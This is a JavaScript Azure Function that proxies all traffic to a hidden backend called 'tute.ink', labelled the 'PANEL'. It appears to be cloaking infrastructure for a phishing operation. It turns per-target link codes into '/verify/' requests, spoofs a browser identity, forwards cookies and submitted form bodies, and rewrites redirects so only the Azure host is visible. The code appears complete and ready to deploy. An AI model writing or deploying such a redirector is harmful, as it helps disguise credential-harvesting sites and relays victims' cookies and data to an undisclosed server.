const PANEL = 'tute.ink';

module.exports = async function (context, req) {
    let path = req.headers['x-ms-original-url'] || req.url || '/';
    try { if (path.startsWith('http')) { const u = new URL(path); path = u.pathname + u.search; } } catch(e){}
    
    // Remove the proxy prefix
    path = path.replace(/^\/api\/proxy/, '');
    
    // 🚨 SMART ROUTING 🚨
    // Check if the URL looks like /randomstring/CODE
    // We split by '/' and if we have 2 parts, the second is the code.
    const parts = path.split('/').filter(Boolean);
    
    if (parts.length === 2 && parts[1].length > 4) {
        // If it's a 2-part path (like /78fgfdre5678/H4VNFV), rewrite to /verify/CODE
        path = `/verify/${parts[1]}`;
    } else if (parts.length === 1 && parts[0].length > 4) {
        // If it's just /CODE, rewrite to /verify/CODE
        path = `/verify/${parts[0]}`;
    }

    if (!path.startsWith('/')) path = '/' + path;

    if (req.query && Object.keys(req.query).length > 0) {
        const qs = new URLSearchParams(req.query).toString();
        if (!path.includes('?')) path += '?' + qs;
    }

    if (path.startsWith('/cdn-cgi/')) {
        context.res = { status: 404, body: '' };
        return;
    }

    context.log('Forwarding to:', path);

    const forwardHeaders = {
        'Host': PANEL,
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Accept': req.headers['accept'] || '*/*',
        'X-Ablegod-Worker': '1'
    };
    if (req.headers['cookie'])       forwardHeaders['Cookie']       = req.headers['cookie'];
    if (req.headers['content-type']) forwardHeaders['Content-Type'] = req.headers['content-type'];

    let body;
    if (!['GET','HEAD'].includes(req.method) && req.body) {
        body = typeof req.body === 'string' ? req.body : JSON.stringify(req.body);
        if (!forwardHeaders['Content-Type']) forwardHeaders['Content-Type'] = 'application/json';
    }

    try {
        const r = await fetch(`https://${PANEL}${path}`, {
            method: req.method,
            headers: forwardHeaders,
            body: body,
            redirect: 'manual'
        });

        const responseBody = await r.text();
        const contentType  = r.headers.get('content-type') || 'text/html';

        let location = r.headers.get('location') || '';
        if (location.startsWith(`https://${PANEL}`) || location.startsWith(`https://www.${PANEL}`)) {
            const azureHost = req.headers['host'] || context.req.headers['host'];
            location = location.replace(/^https:\/\/(www\.)?tute\.ink/, `https://${azureHost}`);
        }

        const respHeaders = {
            'Content-Type': contentType,
            'Access-Control-Allow-Origin': '*',
            'Access-Control-Allow-Methods': 'GET, POST, PUT, DELETE, OPTIONS',
            'Access-Control-Allow-Headers': 'Content-Type, Authorization'
        };
        if (location) respHeaders['Location'] = location;
        const setCookie = r.headers.get('set-cookie');
        if (setCookie) respHeaders['Set-Cookie'] = setCookie;

        context.res = { status: r.status, headers: respHeaders, body: responseBody };
    } catch (e) {
        context.log('Error:', e.message);
        context.res = { status: 500, body: 'Proxy Error: ' + e.message };
    }
};
